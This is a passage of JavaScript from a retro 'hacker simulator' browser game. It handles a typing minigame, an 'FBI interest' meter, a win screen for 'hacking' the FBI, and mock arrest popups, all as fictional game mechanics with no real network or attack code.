        command = command.slice(0, Math.max(40, Math.min(80, Math.floor(command.length / 2))));
      }
    }

  // init combo and multiplier
  window._game = window._game || {};
  const persistedMult = window._game.lastMultiplier || 1;
  hackState = { target: match, command, pos: 0, mistakes: 0, combo: 0, multiplier: persistedMult };
  // starting a hack is noisy: bump FBI interest
  state.fbiInterest = Math.min(100, (state.fbiInterest || 0) + 10);
  renderMeters();

  // start a 1s FBI interest tick while hacking
  if (!window._game) window._game = {};
  if (window._game._hackFbiInterval) clearInterval(window._game._hackFbiInterval);
  window._game._hackFbiInterval = setInterval(() => {
    state.fbiInterest = Math.min(100, (state.fbiInterest || 0) + 1);
    renderMeters();
    if (state.fbiInterest >= 100) {
      // trigger capture and end hack
      handleFbiCapture('during hack minigame (auto)');
      endHack(false);
    }
  }, 1000);

    // show minigame
    minigameEl.innerHTML = '';
    for (let ch of command) {
      const span = document.createElement('span');
      span.className = 'char';
      // keep real character as textContent so comparisons still work
      span.textContent = ch;
      // mark spaces so they can be rendered visibly via CSS
      if (ch === ' ') {
        span.classList.add('space');
      }
      minigameEl.appendChild(span);
    }
  // ensure the minigame container will wrap long commands and fit the terminal
  try {
    minigameEl.style.whiteSpace = 'pre-wrap';
    minigameEl.style.wordBreak = 'break-word';
    minigameEl.style.width = '100%';
    minigameEl.style.boxSizing = 'border-box';
  } catch (e) {}
  minigameEl.classList.add('visible');
  minigameEl.setAttribute('aria-hidden','false');
  // ensure combo UI exists and is shown
  updateComboUI();
  // focus input
  inputEl.value = '';
  inputEl.focus();
  }

  function endHack(success) {
    if (!hackState) return;
    if (success) {
      appendLine('Hack successful: ' + hackState.target, 'muted');
      // per-keystroke scoring already applied to state.hackerScore.
      // clear currentPoints and refresh meters
      hackState.currentPoints = 0;
      renderMeters();
      // record ownership
      window._game.owned = window._game.owned || [];
      window._game.owned.push(hackState.target);
      // remember multiplier for downloads if user exits immediately
      window._game.lastMultiplier = hackState.multiplier || 1;
      // if this was the FBI, trigger ultimate win
      try {
        const parts = hackState.target.split('  ');
        const host = parts[1] || parts[0] || '';
        if ((host || '').toLowerCase().includes('fbi.gov')) {
          // small delay then show ultimate win
          setTimeout(() => showUltimateWin(), 500);
        }
      } catch (e) {}
    } else {
      appendLine('Hack aborted.', 'muted');
      // clear any partially accrued points on abort
      if (hackState) hackState.currentPoints = 0;
      renderMeters();
    }
    // cleanup
  // clear FBI hacking flag if set
  try { if (window._game) window._game._hackingFbi = false; } catch(e){}
  hackState = null;
    minigameEl.classList.remove('visible');
    minigameEl.setAttribute('aria-hidden','true');
    // stop the hack FBI interval if running
    try {
      if (window._game && window._game._hackFbiInterval) {
        clearInterval(window._game._hackFbiInterval);
        window._game._hackFbiInterval = null;
      }
    } catch (e) {}
  }

  // final win sequence when FBI hacked
  function showUltimateWin() {
    // show a dramatic modal with an 'FBI system' image and a giant green skull message
    try {
      if (document.getElementById('game-modal')) return;
      const overlay = document.createElement('div');
      overlay.id = 'game-modal';
      overlay.style.position = 'fixed';
      overlay.style.left = '0'; overlay.style.top = '0'; overlay.style.width = '100%'; overlay.style.height = '100%';
      overlay.style.background = 'rgba(0,0,0,0.9)';
      overlay.style.display = 'flex'; overlay.style.alignItems = 'center'; overlay.style.justifyContent = 'center';
      overlay.style.zIndex = 99999;

      const box = document.createElement('div');
      box.style.background = '#030303';
      box.style.color = '#dfffe0';
      box.style.border = '2px solid rgba(0,255,120,0.06)';
      box.style.padding = '26px';
      box.style.maxWidth = '920px';
      box.style.width = '90%';
      box.style.boxShadow = '0 16px 64px rgba(0,0,0,0.9)';
      box.style.fontFamily = 'monospace';
      box.style.textAlign = 'center';

      // fake FBI system image (styled div)
      const art = document.createElement('div');
      art.style.background = 'linear-gradient(180deg,#071018,#000)';
      art.style.border = '2px solid rgba(255,255,255,0.04)';
      art.style.padding = '18px';
      art.style.marginBottom = '18px';
      art.style.borderRadius = '8px';
      art.style.display = 'flex';
      art.style.flexDirection = 'column';
      art.style.alignItems = 'center';
      art.style.justifyContent = 'center';

      const seal = document.createElement('div');
      seal.textContent = 'FBI SYSTEM';
      seal.style.fontSize = '28px';
      seal.style.letterSpacing = '2px';
      seal.style.color = '#fff';
      seal.style.marginBottom = '12px';
      art.appendChild(seal);

      const img = document.createElement('div');
      img.style.width = '680px';
      img.style.height = '260px';
      img.style.background = 'linear-gradient(90deg,#0b2940,#031a29)';
      img.style.border = '1px solid rgba(255,255,255,0.04)';
      img.style.borderRadius = '6px';
      img.style.display = 'flex';
      img.style.alignItems = 'center';
      img.style.justifyContent = 'center';
      img.style.color = '#9fffbf';
      img.style.fontSize = '18px';
      img.textContent = 'OFFICIAL FBI CONTROL PANEL — SEAL EMBEDDED';
      art.appendChild(img);

      box.appendChild(art);

      const skull = document.createElement('div');
      skull.innerHTML = `<div style="font-size:56px;color:#5fff5f;font-weight:900;filter:drop-shadow(0 12px 24px rgba(0,255,60,0.14))">☠</div>`;
      skull.style.marginBottom = '12px';
      box.appendChild(skull);

      const msg = document.createElement('div');
      msg.style.fontSize = '20px';
      msg.style.color = '#7fff7f';
      msg.style.fontWeight = '900';
      msg.style.marginBottom = '14px';
      msg.textContent = 'YOU HAVE BEEN PWNED BY THE MOST L337 HACKER!!!!!';
      box.appendChild(msg);

      const sub = document.createElement('div');
      sub.style.color = '#bfffbf';
      sub.style.marginBottom = '18px';
      sub.textContent = 'All targets unlocked. You win. Type \"restart\" to play again.';
      box.appendChild(sub);

      const btn = document.createElement('button');
      btn.textContent = 'Restart Game';
      btn.style.padding = '10px 18px';
      btn.style.fontFamily = 'monospace';
      btn.style.fontSize = '16px';
      btn.style.cursor = 'pointer';
      btn.addEventListener('click', () => {
        try { location.reload(); } catch (e) { document.body.removeChild(overlay); }
      });
      box.appendChild(btn);

      overlay.appendChild(box);
      document.body.appendChild(overlay);
      // append terminal final lines
      appendLine('*** FINAL: FBI COMPROMISED ***', 'muted');
      appendLine('You are the most l337 hacker. Game complete.', 'muted');
    } catch (e) {
      try { alert('YOU WIN - FBI PWNED'); } catch (e) {}
    }
  }

  // list-downloads command (local)
  // placed after endHack so helper functions are available
  // handler in main router should recognize 'list-downloads' which was added to COMMANDS

  // FBI interest decay: reduce faster now. Decay pauses while the hacking minigame is active (hackState)
  // New behavior: decay 1 point every 800ms when not hacking (faster decrease), pause while hacking.
  setInterval(() => {
    try {
      if (typeof state.fbiInterest === 'number' && state.fbiInterest > 0) {
        // pause decay while hack minigame is active
        if (hackState) return;
        const decayMult = (window._game && window._game.fbiDecayMultiplier) ? window._game.fbiDecayMultiplier : 1;
        // decay more per tick when upgrades increase decay rate
        const decayAmount = Math.max(1, Math.floor(1 * decayMult));
        state.fbiInterest = Math.max(0, state.fbiInterest - decayAmount);
        renderMeters();
      }
    } catch (e) {}
  }, 800);

  // Safety watcher: if any code path sets the FBI interest to >=100 but forgot to call capture,
  // ensure capture is triggered. handleFbiCapture will noop if a recent capture is already active.
  setInterval(() => {
    try {
      if (window._game && window._game._gameOver) return;
      if (typeof state.fbiInterest === 'number' && state.fbiInterest >= 100) {
        // provide context so the handler can log where it came from when appropriate
        handleFbiCapture('auto-watch');
      }
    } catch (e) {}
  }, 500);

  // helper: show a dismissible modal popup (non-blocking)
  function showModal(title, message) {
    try {
      // don't create multiple at once
      if (document.getElementById('game-modal')) return;
      const overlay = document.createElement('div');
      overlay.id = 'game-modal';
      overlay.style.position = 'fixed';
      overlay.style.left = '0'; overlay.style.top = '0'; overlay.style.width = '100%'; overlay.style.height = '100%';
      overlay.style.background = 'rgba(0,0,0,0.6)';
      overlay.style.display = 'flex'; overlay.style.alignItems = 'center'; overlay.style.justifyContent = 'center';
      overlay.style.zIndex = 9999;

     
      const box = document.createElement('div');
      box.style.background = '#0b0b0b';
      box.style.color = '#cfcfcf';
      box.style.border = '1px solid #303030';
      box.style.padding = '20px';
      box.style.maxWidth = '600px';
      box.style.boxShadow = '0 8px 24px rgba(0,0,0,0.8)';
      box.style.fontFamily = 'monospace';
      box.style.fontSize = '14px';

      const h = document.createElement('div');
      h.style.fontWeight = '700';
      h.style.marginBottom = '8px';
      h.textContent = title || 'Notice';
      box.appendChild(h);

      const p = document.createElement('div');
      p.style.whiteSpace = 'pre-wrap';
      p.textContent = message || '';
      box.appendChild(p);

      const btn = document.createElement('button');
      btn.textContent = 'Close';
      btn.style.marginTop = '12px';
      btn.style.padding = '6px 10px';
      btn.style.background = '#111';
      btn.style.color = '#eee';
      btn.style.border = '1px solid #444';
      btn.style.cursor = 'pointer';
      btn.addEventListener('click', () => { document.body.removeChild(overlay); });
      box.appendChild(btn);

      overlay.appendChild(box);
      document.body.appendChild(overlay);
    } catch (e) {
      // fallback to alert if DOM operations fail
      try { alert((title ? title + '\n\n' : '') + (message || '')); } catch (e) {}
    }
  }

  // handle FBI capture: non-blocking popup, halve hacker score, apply cooldown so it doesn't repeatedly trigger
  function handleFbiCapture(contextNote) {
    window._game = window._game || {};
    if (window._game._fbiCaught) return; // already handled recently
    window._game._fbiCaught = true;
    // notify in terminal
    appendLine('*** ALERT: FEDERAL INVESTIGATIONS BUREAU HAS IDENTIFIED YOU ***', 'muted');
    if (contextNote) appendLine(`Context: ${contextNote}`, 'muted');
    appendLine('FBI tracing complete. Field agents are en route and your systems have been linked to your identity.', 'muted');
  // penalty: cut hacker score in half (round down)
  const before = Math.max(0, Math.floor(state.hackerScore));
  const newScore = Math.floor(before / 2);
  const lost = before - newScore;
  state.hackerScore = newScore;
    lastHackerScore = Math.max(lastHackerScore, state.hackerScore);
    renderMeters();
    // show modal popup with intimidating details
    showModal('FBI NOTICE: YOU ARE UNDER ARREST', `This is an official notification from the Federal Bureau of Investigation.\n\nYou have been located, detained, and are subject to criminal prosecution under federal law. Evidence indicates involvement in unauthorized access and exfiltration of protected systems.\n\nConsequences may include long-term incarceration, seizure of equipment, and significant legal penalties.\n\nPenalty applied now: -${lost} hacker points (half of your score).\n\nThis is not a drill. Expect severe, long-term consequences.`);
  // reduce immediate interest so the game doesn't re-trigger continuously: cut current FBI interest in half
  state.fbiInterest = Math.floor((state.fbiInterest || 100) / 2);
    renderMeters();
  // reset persisted multiplier on capture
  try { window._game.lastMultiplier = 1; } catch(e){}
    // cooldown: allow next capture after 8 seconds
    // if we were hacking the FBI, end the game completely with life imprisonment modal
    if (window._game && window._game._hackingFbi) {
      try {
        // disable input
        try { inputEl.disabled = true; } catch (e) {}
        // show final arrest modal
        const overlay = document.createElement('div');
        overlay.id = 'game-modal';
        overlay.style.position = 'fixed';
        overlay.style.left = '0'; overlay.style.top = '0'; overlay.style.width = '100%'; overlay.style.height = '100%';
        overlay.style.background = 'rgba(0,0,0,0.95)';
        overlay.style.display = 'flex'; overlay.style.alignItems = 'center'; overlay.style.justifyContent = 'center';
        overlay.style.zIndex = 99999;
        const box = document.createElement('div');
        box.style.background = '#050505';
        box.style.color = '#ffdddd';
        box.style.border = '2px solid rgba(255,0,0,0.12)';
        box.style.padding = '26px';
        box.style.maxWidth = '820px';
        box.style.boxShadow = '0 20px 80px rgba(0,0,0,0.9)';
        box.style.fontFamily = 'monospace';
        box.style.textAlign = 'center';
        const h = document.createElement('div'); h.style.fontSize='22px'; h.style.fontWeight='900'; h.style.color='#ff8080'; h.textContent = 'OFFICIAL NOTICE: ARRESTED FOR FEDERAL TRESPASS'; box.appendChild(h);
        const p = document.createElement('div'); p.style.marginTop='12px'; p.style.whiteSpace='pre-wrap'; p.textContent = `You were caught attempting to hack the Federal Bureau of Investigation.\n\nThis attempt constitutes a federal crime. You will be prosecuted to the fullest extent of the law, and are hereby sentenced to life imprisonment in this simulation. Your game has ended.`; box.appendChild(p);
        const btn = document.createElement('button'); btn.textContent='Exit to Desktop'; btn.style.marginTop='18px'; btn.style.padding='8px 12px'; btn.style.cursor='pointer'; btn.addEventListener('click', ()=>{ try { location.reload(); } catch(e){} }); box.appendChild(btn);
        overlay.appendChild(box); document.body.appendChild(overlay);
      } catch (e) {}
      // permanently mark game-over so safety watcher won't re-trigger
      window._game._gameOver = true;
      return; // do not schedule a cooldown
    }
    setTimeout(() => { window._game._fbiCaught = false; }, 8000);
  }


  // initial welcome
  appendLine('Super l337 Hacker - Retro Simulator', 'muted');
  appendLine('Type \"help\" to see available commands.', 'muted');
  renderMeters();

  // expose some test helpers to console for manual testing without overwriting game state
  window._game = window._game || {};
  window._game.state = state;
  window._game.addHackerPoints = function(n = 10) { state.hackerScore += n; lastHackerScore = Math.max(lastHackerScore, state.hackerScore); renderMeters(); };
  window._game.addFbiPoints = function(n = 10) { state.fbiInterest = Math.min(100, state.fbiInterest + n); showFbiDelta(n); renderMeters(); if (state.fbiInterest >= 100) handleFbiCapture('manual increase'); };

})();
